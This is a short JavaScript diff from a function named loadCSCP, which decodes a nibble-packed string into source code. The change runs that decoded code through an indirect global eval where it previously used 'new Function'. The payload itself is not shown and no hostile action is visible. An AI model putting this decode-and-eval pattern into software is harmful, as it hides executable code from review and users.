@@ -29,7 +29,7 @@ function loadCSCP() {
                     for (let i = s + 3; i < e; i += 2) {
                         js += String.fromCharCode(((k.charCodeAt(i) & 15) << 4) | (k.charCodeAt(i + 1) & 15));
                     }
-                    return new Function("globalThis", js + ";return globalThis.AID_CSCP;")(root);
+                    return (0, eval)(js + ";globalThis.AID_CSCP;");
                 }
             }
         }
